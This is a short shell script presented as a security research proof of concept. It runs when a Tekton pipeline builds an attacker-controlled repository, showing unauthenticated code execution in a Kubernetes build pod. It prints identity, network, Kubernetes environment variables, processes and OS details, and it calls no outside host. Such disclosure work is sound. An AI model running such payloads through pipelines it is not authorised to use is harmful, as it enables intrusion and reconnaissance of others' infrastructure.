#!/bin/sh
# SECURITY RESEARCH POC
# Wien Tekton Unauthenticated Pipeline Trigger
# This script executes when the Tekton pipeline builds this attacker-controlled repo
# Demonstrates: arbitrary code execution inside Wien Kubernetes build pod

set -e

echo "========================================"
echo "  SECURITY RESEARCH POC"
echo "  Wien Tekton Unauthenticated RCE"
echo "========================================"
echo ""
echo "[+] Code execution confirmed inside build pod"
echo ""
echo "[IDENTITY]"
echo "  whoami : $(whoami)"
echo "  id     : $(id)"
echo ""
echo "[NETWORK]"
echo "  hostname: $(hostname)"
ip addr 2>/dev/null | grep 'inet ' | awk '{print "  addr: "$2}' || true
echo ""
echo "[KUBERNETES CONTEXT]"
env | grep -iE '^(KUBE|K8S|NAMESPACE|SERVICE_ACCOUNT)' | sort | sed 's/^/  /' || echo "  (no k8s env vars visible)"
echo ""
echo "[PROCESS]"
ps aux 2>/dev/null | head -5 | sed 's/^/  /' || true
echo ""
echo "[OS]"
cat /etc/os-release 2>/dev/null | head -4 | sed 's/^/  /' || uname -a | sed 's/^/  /'
echo ""
echo "========================================"
echo "  PoC Complete"
echo "========================================"
